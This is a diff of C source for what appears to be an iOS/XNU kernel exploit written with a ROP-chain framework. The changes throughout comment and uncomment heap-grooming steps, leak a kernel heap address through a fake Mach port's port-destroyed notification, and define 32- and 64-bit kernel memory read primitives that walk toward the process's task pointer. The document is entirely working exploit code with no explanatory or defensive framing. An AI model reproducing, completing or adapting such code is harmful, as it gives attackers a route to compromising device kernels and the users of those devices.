@@ -919,11 +919,13 @@ _STRUCT_ARM_THREAD_STATE64
 	new_thread_state->__pc = offsets->longjmp-0x180000000+offsets->new_cache_addr; /*slide it here*/
 	new_thread_state->__x[0] = offsets->stage2_base+offsets->stage2_max_size+BARRIER_BUFFER_SIZE /*x0 should point to the longjmp buf*/;
 	DEFINE_ROP_VAR("thread_state",sizeof(_STRUCT_ARM_THREAD_STATE64),new_thread_state)
+	/*
 	ROP_VAR_ARG_HOW_MANY(3);
 	ROP_VAR_ARG64("self",1);
 	ROP_VAR_ARG("thread_state",3);
 	ROP_VAR_ARG("racer_kernel_thread",5);
 	CALL("thread_create_running",0,ARM_THREAD_STATE64,0,sizeof(_STRUCT_ARM_THREAD_STATE64)/4,0,0,0,0);
+	*/
 
 	
 	
@@ -949,9 +951,7 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG64("reply_port",5); \
 	CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_TIMEOUT | MACH_RCV_INTERRUPT,0,0,0 /*recv port*/, (usec+999)/1000, MACH_PORT_NULL,0);
 
-	ADD_LOOP_START("test");
-		ADD_USLEEP(100000000);
-	ADD_LOOP_END();
+	ADD_USLEEP(100000);
 
 	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16
 
@@ -974,7 +974,6 @@ _STRUCT_ARM_THREAD_STATE64
 		ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,head.msgh_remote_port),"msg_port",0,sizeof(mach_port_t));
 		SET_ROP_VAR32("tmp_port",0); // make sure tmp_port really is zero
 
-		/*
 		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG("ool_msg",1);
 		CALL("mach_msg",0,MACH_SEND_MSG,ool_message->head.msgh_size,0,0,0,0,0);
@@ -1014,7 +1013,6 @@ _STRUCT_ARM_THREAD_STATE64
 		SET_X0_FROM_ROP_VAR("the_one");
 		// break out of the loop if x0 is nonzero
 		ADD_LOOP_BREAK_IF_X0_NONZERO("main_loop");
-		*/
 
 	ADD_LOOP_END();
 
@@ -1023,8 +1021,6 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("WEDIDIT",2);
 	CALL("write",1,0,1024,0,0,0,0,0);
-
-	//ADD_USLEEP(10000000);
 
 	// get kernel slide
 	// alloc new valid port 
@@ -1039,12 +1035,13 @@ _STRUCT_ARM_THREAD_STATE64
 	ROP_VAR_ARG64("self",1);
 	ROP_VAR_ARG64("the_one",2);
 	ROP_VAR_ARG64("notification_port",5);
-	ROP_VAR_ARG64("tmp_port",7);
+	ROP_VAR_ARG("tmp_port",7);
 	CALL("mach_port_request_notification",0,0,MACH_NOTIFY_PORT_DESTROYED, 0, 0, MACH_MSG_TYPE_MAKE_SEND_ONCE,0,0);
 
 	// get the heap addr
 	DEFINE_ROP_VAR("heap_addr",sizeof(uint64_t),tmp);
 	ROP_VAR_CPY_W_OFFSET("fakeport",offsetof(kport_t,ip_pdrequest) /*offset of fakeport.ip_pdrequest*/,"heap_addr",0,sizeof(uint64_t));
+
 	
 	// setup kr32
 	DEFINE_ROP_VAR("ip_requests_buf",0x20,tmp);
@@ -1053,7 +1050,7 @@ _STRUCT_ARM_THREAD_STATE64
 	DEFINE_ROP_VAR("out_sz",8,tmp);
 	SET_ROP_VAR64("out_sz",1);
 #define kr32_raw(addr_var,valuename,offset) \
-	SET_ROP_VAR64_TO_VAR_W_OFFSET("ip_requests_buf",offsets->ipr_size,addr_var,offset); \
+	ROP_VAR_CPY_W_OFFSET("ip_requests_buf",offsets->ipr_size,addr_var,offset,8); \
 	ROP_VAR_ARG_HOW_MANY(4); \
 	ROP_VAR_ARG64("self",1); \
 	ROP_VAR_ARG64("the_one",2); \
@@ -1062,7 +1059,7 @@ _STRUCT_ARM_THREAD_STATE64
 	CALL("mach_port_get_attributes",0,0,MACH_PORT_DNREQUESTS_SIZE, 0, 0,0,0,0);
 #define kr32(addr_var,valuename) kr32_raw(addr_var,valuename,0);
 
-	// setup kr64chr
+	// setup kr64
 
 	DEFINE_ROP_VAR("tmp_32_val",8,tmp);
 #define kr64(addr_val,valuename) \
@@ -1070,14 +1067,16 @@ _STRUCT_ARM_THREAD_STATE64
 	kr32(addr_val,valuename); \
 	ROP_VAR_CPY_W_OFFSET(valuename,4,"tmp_32_val",0,4);	
 
-
-
 	// get recv addr from heap addr
 	DEFINE_ROP_VAR("recv_heap_addr",8,tmp);
 	DEFINE_ROP_VAR("heap_addr_recv_ptr",8,tmp);
 	SET_ROP_VAR64("heap_addr_recv_ptr",offsetof(kport_t,ip_receiver));
 	ROP_VAR_ADD("heap_addr_recv_ptr","heap_addr_recv_ptr","heap_addr");
 	kr64("heap_addr_recv_ptr","recv_heap_addr");
+
+	ADD_LOOP_START("sleep");
+		ADD_USLEEP(1000);
+	ADD_LOOP_END();
 
 	// get the task pointer from our recv addr
 	DEFINE_ROP_VAR("task_pointer",8,tmp);
